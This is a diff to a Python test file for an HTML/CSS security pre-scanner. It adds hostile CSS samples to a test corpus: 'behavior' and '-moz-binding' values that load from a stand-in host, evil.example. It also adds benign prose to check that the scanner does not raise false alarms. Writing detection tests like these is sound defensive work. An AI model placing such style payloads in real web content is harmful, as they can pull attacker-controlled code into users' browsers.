@@ -50,8 +50,20 @@ HOSTILE_CORPUS = (
     # #817 repair regression: the shared decoder used to decode `ul(` here and
     # hand the pre-scan a clean T3/`upgrade` record for fetchable content.
     '<div style="background:\\75rl(http://evil.example/x)">y</div>',
+    # behavior/-moz-binding carry a payload value here, so the pre-scan must
+    # flag them exactly like the output boundary does.
+    '<div style="behavior: url(#default#time2)">y</div>',
+    '<div style="-moz-binding: url(http://evil.example/x.xml)">y</div>',
 )
 CLEAN_BRIEF = "A calm spring bake-sale poster"
+# Prose that names the CSS `behavior` property as an English heading must not
+# flip either scanner: the value anchor in the shared CSS primitive pattern
+# keeps these renderable (the bundled Apple system was trust-banned by the
+# unanchored form).
+CLEAN_PROSE = (
+    "- **Pressed Behavior:** active controls reduce scale slightly.",
+    "- **Container behavior:** constrained readable core with generous outer margins.",
+)
 
 
 def _prescan(
@@ -102,6 +114,17 @@ def test_clean_brief_stays_t3_with_upgrade_recommendation() -> None:
 
     assert tier == TrustTier.T3
     assert record.warden_flags == ()
+    assert record.warden_recommendation == "upgrade"
+
+
+@pytest.mark.contract("behavioral")
+@pytest.mark.scope("unit")
+@pytest.mark.parametrize("content", CLEAN_PROSE)
+def test_behavior_prose_gets_no_blocking_flag_and_stays_upgradeable(content: str) -> None:
+    tier, record = _prescan(content)
+
+    assert tier == TrustTier.T3
+    assert not output_boundary_flags(content)
     assert record.warden_recommendation == "upgrade"
 
 
